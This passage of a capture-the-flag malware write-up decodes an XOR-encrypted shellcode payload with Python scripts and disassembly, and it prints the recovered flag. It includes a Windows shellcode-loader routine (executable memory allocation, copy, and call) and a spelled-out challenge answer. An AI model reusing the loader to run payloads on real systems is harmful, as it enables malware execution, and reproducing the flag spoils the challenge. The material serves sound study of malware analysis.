+│           ; CODE XREF from fcn.00000000 @ 0x4c(x)
+│       ┌─&gt; 0x00000042      8137a5a5a5a5   xor dword [edi], 0xa5a5a5a5 ; [0xa5a5a5a5:4]=-1
+│       ╎   0x00000048      83c704         add edi, 4
+│       ╎   0x0000004b      49             dec ecx
+│       └─&lt; 0x0000004c      75f4           jne 0x42
+│           0x0000004e      c644242600     mov byte [var_26h], 0
+│           0x00000053      c6857fffff..   mov byte [var_81h], 0
+│           0x0000005a      89e6           mov esi, esp
+│           0x0000005c      8d7d80         lea edi, [var_80h]
+│           0x0000005f      b926000000     mov ecx, 0x26               ; '&amp;'
+│           ; CODE XREF from fcn.00000000 @ 0x6b(x)
+│       ┌─&gt; 0x00000064      8a06           mov al, byte [esi]
+│       ╎   0x00000066      8807           mov byte [edi], al
+│       ╎   0x00000068      46             inc esi
+│       ╎   0x00000069      47             inc edi
+│       ╎   0x0000006a      49             dec ecx
+│       └─&lt; 0x0000006b      75f7           jne 0x64
+│           0x0000006d      c60700         mov byte [edi], 0
+│           0x00000070      8d3c24         lea edi, [esp]
+│           0x00000073      b940000000     mov ecx, 0x40               ; '@'
+│           0x00000078      b001           mov al, 1
+│       ┌─&gt; 0x0000007a      8807           mov byte [edi], al
+│       ╎   0x0000007c      47             inc edi
+│       ╎   0x0000007d      49             dec ecx
+│       └─&lt; 0x0000007e      75fa           jne 0x7a
+│           0x00000080      c9             leave
+└           0x00000081      c3             ret</code></pre></figure>
+
+<p>There are some hex values pushed somewhere and also <code class="language-plaintext highlighter-rouge">0xa5a5a5a5</code> which I believe is a key that XORs each of those pushed values.</p>
+
+<p>Now I just wrote a script to XOR them:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">):</span>
+    <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">):</span>
+        <span class="n">decrypted_byte</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+        <span class="n">decrypted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypted_byte</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">)</span>
+
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+    <span class="s">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'</span>
+    <span class="s">'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'</span>
+    <span class="s">'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span>
+<span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="p">)</span>
+<span class="n">decrypted</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="c1"># The pushed values from the disassembly
+</span><span class="n">pushed_values</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="mh">0x8484d893</span><span class="p">,</span> <span class="mh">0x97c6c390</span><span class="p">,</span> <span class="mh">0x929390c3</span><span class="p">,</span> <span class="mh">0xc7c3c490</span><span class="p">,</span>
+    <span class="mh">0x939c939c</span><span class="p">,</span> <span class="mh">0xc6c69cc0</span><span class="p">,</span> <span class="mh">0x939cc697</span><span class="p">,</span> <span class="mh">0xc19dc794</span><span class="p">,</span>
+    <span class="mh">0x9196c1de</span><span class="p">,</span> <span class="mh">0xc2c4c9c3</span>
+<span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Decoding the pushed values with XOR 0xA5A5A5A5:"</span><span class="p">)</span>
+<span class="n">decoded_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+
+<span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">pushed_values</span><span class="p">:</span>
+    <span class="c1"># XOR with 0xA5A5A5A5
+</span>    <span class="n">decoded_value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">^</span> <span class="mh">0xA5A5A5A5</span>
+    <span class="c1"># Convert to bytes (little-endian)
+</span>    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">decoded_value</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+    <span class="n">decoded_string</span> <span class="o">+=</span> <span class="n">decoded_bytes</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="si">}</span><span class="s"> XOR A5A5A5A5 = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">decoded_value</span><span class="p">)</span><span class="si">}</span><span class="s"> -&gt; </span><span class="si">{</span><span class="n">decoded_bytes</span><span class="si">}</span><span class="s">"</span><span class="p">)</span></code></pre></figure>
+
+<p>Output:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Decoding the pushed values with XOR 0xA5A5A5A5:
+0x8484d893 XOR A5A5A5A5 <span class="o">=</span> 0x21217d36 -&gt; b<span class="s1">'6}!!'</span>
+0x97c6c390 XOR A5A5A5A5 <span class="o">=</span> 0x32636635 -&gt; b<span class="s1">'5fc2'</span>
+0x929390c3 XOR A5A5A5A5 <span class="o">=</span> 0x37363566 -&gt; b<span class="s1">'f567'</span>
+0xc7c3c490 XOR A5A5A5A5 <span class="o">=</span> 0x62666135 -&gt; b<span class="s1">'5afb'</span>
+0x939c939c XOR A5A5A5A5 <span class="o">=</span> 0x36393639 -&gt; b<span class="s1">'9696'</span>
+0xc6c69cc0 XOR A5A5A5A5 <span class="o">=</span> 0x63633965 -&gt; b<span class="s1">'e9cc'</span>
+0x939cc697 XOR A5A5A5A5 <span class="o">=</span> 0x36396332 -&gt; b<span class="s1">'2c96'</span>
+0xc19dc794 XOR A5A5A5A5 <span class="o">=</span> 0x64386231 -&gt; b<span class="s1">'1b8d'</span>
+0x9196c1de XOR A5A5A5A5 <span class="o">=</span> 0x3433647b -&gt; b<span class="s1">'{d34'</span>
+0xc2c4c9c3 XOR A5A5A5A5 <span class="o">=</span> 0x67616c66 -&gt; b<span class="s1">'flag'</span></code></pre></figure>
+
+<p>It looks like the flag but in reverse order, so I manually wrote each part and got the flag: <code class="language-plaintext highlighter-rouge">flag{d341b8d2c96e9cc96965afbf5675fc26}</code>. I believe it’s something with endianness.</p>
+
+<p>Also later I wrote this script that automatically solves it and gives the flag:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">):</span>
+    <span class="s">"""
+    XOR decrypt ciphertext with repeating key
+    """</span>
+    <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">):</span>
+        <span class="n">decrypted_byte</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+        <span class="n">decrypted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypted_byte</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">analyze_shellcode</span><span class="p">():</span>
+    <span class="s">"""
+    Complete analysis of the encrypted shellcode to extract the flag
+    """</span>
+    <span class="c1"># Base64 encoded payload and key from the original script
+</span>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+        <span class="s">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'</span>
+        <span class="s">'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'</span>
+        <span class="s">'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span>
+    <span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="p">)</span>
+
+    <span class="c1"># First layer: XOR decrypt the payload
+</span>    <span class="n">decrypted_shellcode</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"=== SHELLCODE ANALYSIS ==="</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Encrypted payload size: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Key size: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Decrypted shellcode size: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">decrypted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
+
+    <span class="c1"># Save decrypted shellcode for analysis
+</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'shellcode.bin'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_shellcode</span><span class="p">)</span>
+
+    <span class="c1"># The shellcode pushes these values onto the stack (in assembly order)
+</span>    <span class="n">pushed_values_assembly_order</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="mh">0x8484d893</span><span class="p">,</span> <span class="mh">0x97c6c390</span><span class="p">,</span> <span class="mh">0x929390c3</span><span class="p">,</span> <span class="mh">0xc7c3c490</span><span class="p">,</span>
+        <span class="mh">0x939c939c</span><span class="p">,</span> <span class="mh">0xc6c69cc0</span><span class="p">,</span> <span class="mh">0x939cc697</span><span class="p">,</span> <span class="mh">0xc19dc794</span><span class="p">,</span>
+        <span class="mh">0x9196c1de</span><span class="p">,</span> <span class="mh">0xc2c4c9c3</span>
+    <span class="p">]</span>
+
+    <span class="c1"># Reverse for stack order (last pushed = first in memory)
+</span>    <span class="n">pushed_values_stack_order</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">pushed_values_assembly_order</span><span class="p">))</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">=== PUSHED VALUES ANALYSIS ==="</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Values as pushed in assembly (top to bottom in code):"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">pushed_values_assembly_order</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"  push 0x</span><span class="si">{</span><span class="n">val</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Values in stack order (bottom to top in memory):"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">pushed_values_stack_order</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"  [esp+</span><span class="si">{</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">] = 0x</span><span class="si">{</span><span class="n">val</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># XOR decode each value with 0xA5A5A5A5
+</span>    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xA5A5A5A5</span>
+    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">=== XOR DECODING ==="</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Using XOR key: 0x</span><span class="si">{</span><span class="n">xor_key</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">pushed_values_stack_order</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">val</span> <span class="o">^</span> <span class="n">xor_key</span>
+        <span class="n">result_bytes</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+        <span class="n">decoded_bytes</span> <span class="o">+=</span> <span class="n">result_bytes</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"0x</span><span class="si">{</span><span class="n">val</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s"> XOR 0x</span><span class="si">{</span><span class="n">xor_key</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s"> = 0x</span><span class="si">{</span><span class="n">result</span><span class="si">:</span><span class="mi">08</span><span class="n">x</span><span class="si">}</span><span class="s"> -&gt; </span><span class="si">{</span><span class="n">result_bytes</span><span class="si">}</span><span class="s"> -&gt; '</span><span class="si">{</span><span class="n">result_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Full decoded string: </span><span class="si">{</span><span class="n">decoded_bytes</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># The shellcode copies 0x26 (38) bytes to a buffer
+</span>    <span class="n">flag_data</span> <span class="o">=</span> <span class="n">decoded_bytes</span><span class="p">[:</span><span class="mh">0x26</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">=== FLAG EXTRACTION ==="</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Shellcode copies 0x26 (38) bytes to buffer"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Flag: </span><span class="si">{</span><span class="n">flag_data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># Clean up the flag (remove null bytes/padding if any)
+</span>    <span class="n">clean_flag</span> <span class="o">=</span> <span class="n">flag_data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Clean flag: </span><span class="si">{</span><span class="n">clean_flag</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">clean_flag</span>
+
+<span class="k">def</span> <span class="nf">execute_shellcode_demo</span><span class="p">():</span>
+    <span class="s">"""
+    Demonstrate how the original shellcode would execute (Windows only)
+    """</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">=== EXECUTION DEMO ==="</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+            <span class="s">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'</span>
+            <span class="s">'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'</span>
+            <span class="s">'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span>
+        <span class="p">)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="p">)</span>
+        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Allocating executable memory..."</span><span class="p">)</span>
+        <span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span>
+            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span>  <span class="c1"># MEM_COMMIT | MEM_RESERVE
+</span>            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>     <span class="c1"># PAGE_EXECUTE_READWRITE
+</span>        <span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Copying shellcode to memory..."</span><span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)).</span><span class="n">from_buffer</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+        <span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span>
+            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> 
+            <span class="n">buf</span><span class="p">,</span> 
+            <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+        <span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Creating function pointer..."</span><span class="p">)</span>
+        <span class="n">functype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">)</span>
+        <span class="n">fn</span> <span class="o">=</span> <span class="n">functype</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Executing shellcode..."</span><span class="p">)</span>
+        <span class="n">fn</span><span class="p">()</span>
+
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Execution failed (expected on Linux): </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"This is normal - the shellcode is Windows x86 assembly"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">analyze_shellcode</span><span class="p">()</span></code></pre></figure>
+
+<p>Running it we get:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">===</span> SHELLCODE ANALYSIS <span class="o">===</span>
+Encrypted payload size: 130 bytes
+Key size: 22 bytes
+Decrypted shellcode size: 130 bytes
+
+<span class="o">===</span> PUSHED VALUES ANALYSIS <span class="o">===</span>
+Values as pushed <span class="k">in </span>assembly <span class="o">(</span>top to bottom <span class="k">in </span>code<span class="o">)</span>:
+push 0x8484d893
+push 0x97c6c390
+push 0x929390c3
+push 0xc7c3c490
+push 0x939c939c
+push 0xc6c69cc0
+push 0x939cc697
+push 0xc19dc794
+push 0x9196c1de
+push 0xc2c4c9c3
+
+Values <span class="k">in </span>stack order <span class="o">(</span>bottom to top <span class="k">in </span>memory<span class="o">)</span>:
+<span class="o">[</span>esp+00] <span class="o">=</span> 0xc2c4c9c3
+<span class="o">[</span>esp+04] <span class="o">=</span> 0x9196c1de
+<span class="o">[</span>esp+08] <span class="o">=</span> 0xc19dc794
+<span class="o">[</span>esp+0c] <span class="o">=</span> 0x939cc697
+<span class="o">[</span>esp+10] <span class="o">=</span> 0xc6c69cc0
+<span class="o">[</span>esp+14] <span class="o">=</span> 0x939c939c
+<span class="o">[</span>esp+18] <span class="o">=</span> 0xc7c3c490
+<span class="o">[</span>esp+1c] <span class="o">=</span> 0x929390c3
+<span class="o">[</span>esp+20] <span class="o">=</span> 0x97c6c390
+<span class="o">[</span>esp+24] <span class="o">=</span> 0x8484d893
+
+<span class="o">===</span> XOR DECODING <span class="o">===</span>
+Using XOR key: 0xa5a5a5a5
+0xc2c4c9c3 XOR 0xa5a5a5a5 <span class="o">=</span> 0x67616c66 -&gt; b<span class="s1">'flag'</span> -&gt; <span class="s1">'flag'</span>
+0x9196c1de XOR 0xa5a5a5a5 <span class="o">=</span> 0x3433647b -&gt; b<span class="s1">'{d34'</span> -&gt; <span class="s1">'{d34'</span>
+0xc19dc794 XOR 0xa5a5a5a5 <span class="o">=</span> 0x64386231 -&gt; b<span class="s1">'1b8d'</span> -&gt; <span class="s1">'1b8d'</span>
+0x939cc697 XOR 0xa5a5a5a5 <span class="o">=</span> 0x36396332 -&gt; b<span class="s1">'2c96'</span> -&gt; <span class="s1">'2c96'</span>
+0xc6c69cc0 XOR 0xa5a5a5a5 <span class="o">=</span> 0x63633965 -&gt; b<span class="s1">'e9cc'</span> -&gt; <span class="s1">'e9cc'</span>
+0x939c939c XOR 0xa5a5a5a5 <span class="o">=</span> 0x36393639 -&gt; b<span class="s1">'9696'</span> -&gt; <span class="s1">'9696'</span>
+0xc7c3c490 XOR 0xa5a5a5a5 <span class="o">=</span> 0x62666135 -&gt; b<span class="s1">'5afb'</span> -&gt; <span class="s1">'5afb'</span>
+0x929390c3 XOR 0xa5a5a5a5 <span class="o">=</span> 0x37363566 -&gt; b<span class="s1">'f567'</span> -&gt; <span class="s1">'f567'</span>
+0x97c6c390 XOR 0xa5a5a5a5 <span class="o">=</span> 0x32636635 -&gt; b<span class="s1">'5fc2'</span> -&gt; <span class="s1">'5fc2'</span>
+0x8484d893 XOR 0xa5a5a5a5 <span class="o">=</span> 0x21217d36 -&gt; b<span class="s1">'6}!!'</span> -&gt; <span class="s1">'6}!!'</span>
+
+Full decoded string: b<span class="s1">'flag{d341b8d2c96e9cc96965afbf5675fc26}!!'</span>
+
+<span class="o">===</span> FLAG EXTRACTION <span class="o">===</span>
+Shellcode copies 0x26 <span class="o">(</span>38<span class="o">)</span> bytes to buffer
+Flag: flag<span class="o">{</span>d341b8d2c96e9cc96965afbf5675fc26<span class="o">}</span>
+Clean flag: flag<span class="o">{</span>d341b8d2c96e9cc96965afbf5675fc26<span class="o">}</span></code></pre></figure>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">flag{d341b8d2c96e9cc96965afbf5675fc26}</code></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This challenge demonstrates a multi-stage malware delivery system:</p>
+<ol>
+  <li>Initial PowerShell downloader</li>
+  <li>ZIP archive containing Python environment</li>
+  <li>Obfuscated Python script with embedded shellcode</li>
+  <li>XOR-encrypted shellcode containing the flag</li>
+</ol>
+
+<p>The key was to follow the chain of execution and analyze the shellcode to extract the hidden flag. The shellcode used XOR encryption with <code class="language-plaintext highlighter-rouge">0xA5A5A5A5</code> to hide the flag in memory, and understanding the stack order was crucial for proper decoding.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="malware" /><summary type="html"><![CDATA[Category: Malware]]></summary></entry></feed>
